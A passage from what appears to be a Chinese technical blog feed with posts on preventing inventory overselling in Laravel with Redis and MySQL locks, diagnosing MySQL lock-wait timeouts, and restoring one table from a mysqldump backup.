class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"github.com/PeterYangs/tools/http"</span></span><br><span class="line">    <span class="string">"sync"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    client := http.Client()</span><br><span class="line">    wait := sync.WaitGroup&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">50</span>; i++ &#123;</span><br><span class="line">        wait.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(w *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> w.Done()</span><br><span class="line">            res, _ := client.Request().GetToString(<span class="string">"http://www.api/test1?id=1"</span>)</span><br><span class="line">            fmt.Println(res)</span><br><span class="line">        &#125;(&amp;wait)</span><br><span class="line">    &#125;</span><br><span class="line">    wait.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="错误示范"><a href="#错误示范" class="headerlink" title="错误示范"></a>错误示范</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    $id = request()-&gt;input(<span class="string">'id'</span>);</span><br><span class="line">    $product = Product::where(<span class="string">'id'</span>, $id)-&gt;firstOrFail();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($product-&gt;num &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"卖光啦！！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $product-&gt;decrement(<span class="string">'num'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看库存：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220416165310.png" alt=""><br>库存超出。</p><h2 id="Redis-存储库存"><a href="#Redis-存储库存" class="headerlink" title="Redis 存储库存"></a>Redis 存储库存</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = request()-&gt;input(<span class="string">'id'</span>);</span><br><span class="line">    $redis = <span class="keyword">new</span> \Redis();</span><br><span class="line">    $num = $redis-&gt;rawCommand(<span class="string">'get'</span>, <span class="string">'product_'</span> . $id);</span><br><span class="line">    <span class="keyword">if</span> ($num &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"卖完啦！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//减库存</span></span><br><span class="line">    $result = $redis-&gt;rawCommand(<span class="string">'decrby'</span>, <span class="string">'product_'</span> . $id, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//减多了回滚</span></span><br><span class="line">    <span class="keyword">if</span> ($result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        $redis-&gt;rawCommand(<span class="string">'incrby'</span>, <span class="string">'product_'</span> . $id, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"卖完啦！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'success'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220416172328.png" alt=""></p><p>库存正常。</p><h2 id="Redis-原子锁"><a href="#Redis-原子锁" class="headerlink" title="Redis 原子锁"></a>Redis 原子锁</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = request()-&gt;input(<span class="string">'id'</span>);</span><br><span class="line">    $lock = \Cache::lock(<span class="string">"product_"</span> . $id, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最多等待5秒，5秒后未获取到锁，则抛出异常</span></span><br><span class="line">        $lock-&gt;block(<span class="number">5</span>);</span><br><span class="line">        $product = TbModel::where(<span class="string">'id'</span>, $id)-&gt;firstOrFail();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($product-&gt;num &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"卖光啦！！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $product-&gt;decrement(<span class="string">'num'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'success'</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (LockTimeoutException $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'当前人数过多'</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        optional($lock)-&gt;release();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220416165550.png" alt=""><br>库存正常。</p><h2 id="Mysql-悲观锁"><a href="#Mysql-悲观锁" class="headerlink" title="Mysql 悲观锁"></a>Mysql 悲观锁</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = request()-&gt;input(<span class="string">'id'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        \DB::beginTransaction();</span><br><span class="line">        $product = Product::where(<span class="string">'id'</span>, $id)-&gt;lockForUpdate()-&gt;first();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($product-&gt;num &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"卖光啦！！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $product-&gt;decrement(<span class="string">'num'</span>);</span><br><span class="line">        \DB::commit();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $exception) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220416165918.png" alt=""></p><p>库存正常。</p><h2 id="Mysql-乐观锁"><a href="#Mysql-乐观锁" class="headerlink" title="Mysql 乐观锁"></a>Mysql 乐观锁</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = request()-&gt;input(<span class="string">'id'</span>);</span><br><span class="line">    $product = TbModel::where(<span class="string">'id'</span>, $id)-&gt;first();</span><br><span class="line">    <span class="keyword">if</span> ($product-&gt;num &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"卖光啦！！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改前检查库存和之前是否一致，不一致说明已经有变动，则放弃更改</span></span><br><span class="line">    $res = \DB::update(<span class="string">'UPDATE `tb` SET num = num -1 WHERE id = ? AND num=?'</span>, [$id, $product-&gt;num]);</span><br><span class="line">    <span class="keyword">if</span> (!$res) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'当前人数过多'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">'success'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220416165918.png" alt=""></p><p>库存正常。</p><p>优化乐观锁，修改库存的 sql 修改为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\DB::<span class="keyword">update</span>(<span class="string">'UPDATE `tb` SET num = num -1 WHERE id = ? AND num-1 &gt;= 0'</span>, [$<span class="keyword">id</span>]);</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上几种方案都可以有效解决库存超出的问题，应用时可以根据实际具体场景进行选择，优先考虑顺序为：<br>Redis 存储 &gt; Redis 原子锁 &gt; Mysql 悲观锁/乐观锁</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/articles/57959" target="_blank" rel="noopener">使用laravel解决库存超出的几个方案</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySql Lock wait timeout exceeded 异常记录</title>
      <link href="/mysql-lock-wait-timeout-exceeded-exception-record/"/>
      <url>/mysql-lock-wait-timeout-exceeded-exception-record/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文链接：<a href="https://ningyu1.github.io/site/post/75-mysql-lock-wait-timeout-exceeded/" target="_blank" rel="noopener">MySql Lock wait timeout exceeded该如何处理？</a></p></blockquote><p>Mysql造成锁的情况有很多，下面我们就列举一些情况：</p><ul><li>执行 <code>DML</code> 操作没有 Commit，再执行删除操作就会锁表。</li><li>在同一事务内先后对同一条数据进行插入和更新操作。</li><li>表索引设计不当，导致数据库出现死锁。</li><li>长事物，阻塞 <code>DDL</code>，继而阻塞所有同表的后续操作。</li></ul><a id="more"></a><p>但是要区分的是 <code>Lock wait timeout exceeded</code> 与 <code>Dead Lock</code> 是不一样。</p><ul><li><code>Lock wait timeout exceeded</code>：后提交的事务等待前面处理的事务释放锁，但是在等待的时候超过了mysql的锁等待时间，就会引发这个异常。</li><li><code>Dead Lock</code>：两个事务互相等待对方释放相同资源的锁，从而造成的死循环，就会引发这个异常。</li></ul><p>还有一个要注意的是 <code>innodb_lock_wait_timeout</code> 与 <code>lock_wait_timeout</code>也是不一样的。</p><ul><li><code>innodb_lock_wait_timeout</code>：innodb 的 <code>DML</code> 操作的行级锁的等待时间</li><li><code>lock_wait_timeout</code>：数据结构 <code>DDL</code> 操作的锁的等待时间</li></ul><p>如何查看 <code>innodb_lock_wait_timeout</code> 的具体值？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#39;innodb_lock_wait_timeout&#39;</span><br></pre></td></tr></table></figure><p>参数修改的范围有Session和Global，并且支持动态修改，可以有两种方法修改：</p><p>方法一：</p><p>通过下面语句修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set innodb_lock_wait_timeout&#x3D;100;</span><br><span class="line">set global innodb_lock_wait_timeout&#x3D;100;</span><br></pre></td></tr></table></figure><blockquote><p>注意 global 的修改对当前线程是不生效的，只有建立新的连接才生效。</p></blockquote><p>方法二：</p><p>修改参数文件 <code>/etc/my.cnf</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">innodb_lock_wait_timeout &#x3D; 50</span><br></pre></td></tr></table></figure><p><code>innodb_lock_wait_timeout</code> 指的是事务等待获取资源等待的最长时间，超过这个时间还未分配到资源则会返回应用失败； 当锁等待超过设置时间的时候，就会报如下的错误；<code>ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction</code>。<br>其参数的时间单位是秒，最小可设置为1s(一般不会设置得这么小)，最大可设置1073741824秒，默认安装时这个值是50s(默认参数设置)</p><h2 id="问题导致的结果"><a href="#问题导致的结果" class="headerlink" title="问题导致的结果"></a>问题导致的结果</h2><ol><li>数据更新或新增后数据会自动回滚</li><li>表操作返回 <code>Lock wait timeout exceeded</code> 并长时间无反应</li></ol><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ul><li>应急方法：<code>show full processlist</code>; kill掉出现问题的进程。 ps.有的时候通过processlist是看不出哪里有锁等待的，当两个事务都在commit阶段是无法体现在processlist上</li><li>根治方法：<code>select * from innodb_trx</code>; 查看有是哪些事务占据了表资源。 ps.通过这个办法就需要对innodb有一些了解才好处理</li></ul><p>说起来很简单找到它杀掉它就搞定了，但是实际上并没有想象的这么简单，当问题出现要分析问题的原因，通过原因定位业务代码可能某些地方实现的有问题，从而来避免今后遇到同样的问题。</p><h2 id="innodb-表的解释"><a href="#innodb-表的解释" class="headerlink" title="innodb_*表的解释"></a>innodb_*表的解释</h2><p><code>Mysql</code>的 <code>InnoDB</code> 存储引擎是支持事务的，事务开启后没有被主动Commit。导致该资源被长期占用，其他事务在抢占该资源时，因上一个事务的锁而导致抢占失败！因此出现 <code>Lock wait timeout exceeded</code></p><p>下面几张表是innodb的事务和锁的信息表，理解这些表就能很好的定位问题。</p><ul><li>innodb_trx：当前运行的所有事务</li><li>innodb_locks：当前出现的锁</li><li>innodb_lock_waits：锁等待的对应关系</li></ul><p>innodb_trx 表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">desc information_schema.innodb_trx;</span><br><span class="line"></span><br><span class="line">trx_id：事务ID。</span><br><span class="line">trx_state：事务状态，有以下几种状态：RUNNING、LOCK WAIT、ROLLING BACK 和 COMMITTING。</span><br><span class="line">trx_started：事务开始时间。</span><br><span class="line">trx_requested_lock_id：事务当前正在等待锁的标识，可以和 INNODB_LOCKS 表 JOIN 以得到更多详细信息。</span><br><span class="line">trx_wait_started：事务开始等待的时间。</span><br><span class="line">trx_weight：事务的权重。</span><br><span class="line">trx_mysql_thread_id：事务线程 ID，可以和 PROCESSLIST 表 JOIN。</span><br><span class="line">trx_query：事务正在执行的 SQL 语句。</span><br><span class="line">trx_operation_state：事务当前操作状态。</span><br><span class="line">trx_tables_in_use：当前事务执行的 SQL 中使用的表的个数。</span><br><span class="line">trx_tables_locked：当前执行 SQL 的行锁数量。</span><br><span class="line">trx_lock_structs：事务保留的锁数量。</span><br><span class="line">trx_lock_memory_bytes：事务锁住的内存大小，单位为 BYTES。</span><br><span class="line">trx_rows_locked：事务锁住的记录数。包含标记为 DELETED，并且已经保存到磁盘但对事务不可见的行。</span><br><span class="line">trx_rows_modified：事务更改的行数。</span><br><span class="line">trx_concurrency_tickets：事务并发票数。</span><br><span class="line">trx_isolation_level：当前事务的隔离级别。</span><br><span class="line">trx_unique_checks：是否打开唯一性检查的标识。</span><br><span class="line">trx_foreign_key_checks：是否打开外键检查的标识。</span><br><span class="line">trx_last_foreign_key_error：最后一次的外键错误信息。</span><br><span class="line">trx_adaptive_hash_latched：自适应散列索引是否被当前事务锁住的标识。</span><br><span class="line">trx_adaptive_hash_timeout：是否立刻放弃为自适应散列索引搜索 LATCH 的标识。</span><br></pre></td></tr></table></figure><p>innodb_locks 表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">desc information_schema.innodb_locks;</span><br><span class="line"></span><br><span class="line">lock_id：锁 ID。</span><br><span class="line">lock_trx_id：拥有锁的事务 ID。可以和 INNODB_TRX 表 JOIN 得到事务的详细信息。</span><br><span class="line">lock_mode：锁的模式。有如下锁类型：行级锁包括：S、X、IS、IX，分别代表：共享锁、排它锁、意向共享锁、意向排它锁。表级锁包括：S_GAP、X_GAP、IS_GAP、IX_GAP 和 AUTO_INC，分别代表共享间隙锁、排它间隙锁、意向共享间隙锁、意向排它间隙锁和自动递增锁。</span><br><span class="line">lock_type：锁的类型。RECORD 代表行级锁，TABLE 代表表级锁。</span><br><span class="line">lock_table：被锁定的或者包含锁定记录的表的名称。</span><br><span class="line">lock_index：当 LOCK_TYPE&#x3D;’RECORD’ 时，表示索引的名称；否则为 NULL。</span><br><span class="line">lock_space：当 LOCK_TYPE&#x3D;’RECORD’ 时，表示锁定行的表空间 ID；否则为 NULL。</span><br><span class="line">lock_page：当 LOCK_TYPE&#x3D;’RECORD’ 时，表示锁定行的页号；否则为 NULL。</span><br><span class="line">lock_rec：当 LOCK_TYPE&#x3D;’RECORD’ 时，表示一堆页面中锁定行的数量，亦即被锁定的记录号；否则为 NULL。</span><br><span class="line">lock_data：当 LOCK_TYPE&#x3D;’RECORD’ 时，表示锁定行的主键；否则为NULL。</span><br></pre></td></tr></table></figure><p>innodb_lock_waits 表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">desc information_schema.innodb_lock_waits;</span><br><span class="line"></span><br><span class="line">requesting_trx_id：请求事务的 ID。</span><br><span class="line">requested_lock_id：事务所等待的锁定的 ID。可以和 INNODB_LOCKS 表 JOIN。</span><br><span class="line">blocking_trx_id：阻塞事务的 ID。</span><br><span class="line">blocking_lock_id：某一事务的锁的 ID，该事务阻塞了另一事务的运行。可以和 INNODB_LOCKS 表 JOIN。</span><br></pre></td></tr></table></figure><h2 id="锁等待的处理步骤"><a href="#锁等待的处理步骤" class="headerlink" title="锁等待的处理步骤"></a>锁等待的处理步骤</h2><p>查看 innodb_lock_waits 表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM innodb_lock_waits;</span><br></pre></td></tr></table></figure><p>innodb_locks 表和 innodb_lock_waits 表联表查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM innodb_locks WHERE lock_trx_id IN (SELECT blocking_trx_id FROM innodb_lock_waits);</span><br></pre></td></tr></table></figure><p>innodb_locks 表 JOIN innodb_lock_waits 表联表查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT innodb_locks.* FROM innodb_locks JOIN innodb_lock_waits ON (innodb_locks.lock_trx_id &#x3D; innodb_lock_waits.blocking_trx_id);</span><br></pre></td></tr></table></figure><p>查询 innodb_trx 表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT trx_id, trx_requested_lock_id, trx_mysql_thread_id, trx_query FROM innodb_trx WHERE trx_state &#x3D; &#39;LOCK WAIT&#39;;</span><br></pre></td></tr></table></figure><p>trx_mysql_thread_id 即 kill 掉事务线程 ID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW ENGINE INNODB STATUS ;</span><br><span class="line">SHOW PROCESSLIST ;</span><br></pre></td></tr></table></figure><p>从上述方法中得到了相关信息，我们可以得到发生锁等待的线程 ID，然后将其 KILL 掉。 KILL 掉发生锁等待的线程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill ID;</span><br></pre></td></tr></table></figure><hr><p>前几天生成环境，有个需求需要跑个脚本处理一下。<br>脚本所做的事情是遍历查询出来的数据集，逐个调用某段逻辑。</p><p>结果等了半天，发现什么都没有修改成功。</p><p>后面查看日志才发现是因为某次抛出异常时，事务没有释放， 而后提交的事务又需要等待前面处理的事务释放锁，但是等待的时间超过了 Mysql <code>innodb_lock_wait_timeout</code> 所设置的超时时间，所以引发了 <code>Lock wait timeout exceeded</code> 异常，事务自动回滚了，也就出现了数据都没有变化的现象。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://ningyu1.github.io/site/post/75-mysql-lock-wait-timeout-exceeded/" target="_blank" rel="noopener">MySql Lock wait timeout exceeded该如何处理？</a></li><li><a href="https://segmentfault.com/a/1190000015314171" target="_blank" rel="noopener">关于MySQL的lock wait timeout exceeded解决方案</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 如何从全备中恢复指定表数据</title>
      <link href="/how-mysql-restores-specified-table-data-from-full-backup/"/>
      <url>/how-mysql-restores-specified-table-data-from-full-backup/</url>
      
        <content type="html"><![CDATA[<p>备份数据库是常有的需求，通常是整库备份，整库还原。<br>但如果只想还原其中部分数据表，该怎么做呢？</p><a id="more"></a><h2 id="测试前准备"><a href="#测试前准备" class="headerlink" title="测试前准备"></a>测试前准备</h2><ol><li>mysqldump 备份指定数据库，如：test_dump</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p mysql -F -R -E --triggers --databases test_dump | gzip &gt;dbtest_$(date +%F).sql.gz;</span><br></pre></td></tr></table></figure><ol start="2"><li>确认备份文件已经生成</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ll</span><br><span class="line"></span><br><span class="line">dbtest_2022-04-09.sql.gz</span><br></pre></td></tr></table></figure><ol start="3"><li>删除需要还原的表</li></ol><p>查看当前数据库中所有表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------+</span><br><span class="line">| Tables_in_test_dump |</span><br><span class="line">+---------------------+</span><br><span class="line">| tb                  |</span><br><span class="line">| tb2                 |</span><br><span class="line">+---------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>查看需要还原的表的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tb2;</span><br><span class="line">+----+------+------+------+</span><br><span class="line">| id | name | val  | memo |</span><br><span class="line">+----+------+------+------+</span><br><span class="line">|  1 | a    |    2 | a2   |</span><br><span class="line">|  2 | a    |    1 | a1   |</span><br><span class="line">|  3 | a    |    3 | a3   |</span><br><span class="line">|  5 | b    |    3 | b3   |</span><br><span class="line">|  6 | b    |    2 | b2   |</span><br><span class="line">|  7 | b    |    4 | b4   |</span><br><span class="line">|  8 | b    |    5 | b5   |</span><br><span class="line">|  9 | b    |    1 | b1   |</span><br><span class="line">+----+------+------+------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>删除目标表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop table tb2;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure><h2 id="从备份中恢复"><a href="#从备份中恢复" class="headerlink" title="从备份中恢复"></a>从备份中恢复</h2><ol><li>从备份文件中找出需要恢复的表的建表语句：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gunzip -c dbtest_2022-04-09.sql.gz | sed -e <span class="string">'/./&#123;H;$!d;&#125;'</span> -e <span class="string">'x;/CREATE TABLE `tb2`/!d;q'</span>;</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `tb222`;</span><br><span class="line">/*!40101 SET @saved_cs_client     = @@character_set_client */;</span><br><span class="line">/*!40101 SET character_set_client = utf8 */;</span><br><span class="line">CREATE TABLE `tb222` (</span><br><span class="line">  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `name` varchar(10) DEFAULT NULL,</span><br><span class="line">  `val` int(11) DEFAULT NULL,</span><br><span class="line">  `memo` varchar(20) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;</span><br><span class="line">/*!40101 SET character_set_client = @saved_cs_client */;</span><br></pre></td></tr></table></figure><ol start="2"><li>从备份文件中找出需要恢复表的数据</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gunzip -c dbtest_2022-04-09.sql.gz | sed -e <span class="string">'/./&#123;H;$!d;&#125;'</span> -e <span class="string">'x;/CREATE TABLE `tb2`/!d;q'</span></span><br><span class="line"></span><br><span class="line">INSERT INTO `tb222` VALUES (1,<span class="string">'a'</span>,2,<span class="string">'a2'</span>),(2,<span class="string">'a'</span>,1,<span class="string">'a1'</span>),(3,<span class="string">'a'</span>,3,<span class="string">'a3'</span>),(5,<span class="string">'b'</span>,3,<span class="string">'b3'</span>),(6,<span class="string">'b'</span>,2,<span class="string">'b2'</span>),(7,<span class="string">'b'</span>,4,<span class="string">'b4'</span>),(8,<span class="string">'b'</span>,5,<span class="string">'b5'</span>),(9,<span class="string">'b'</span>,1,<span 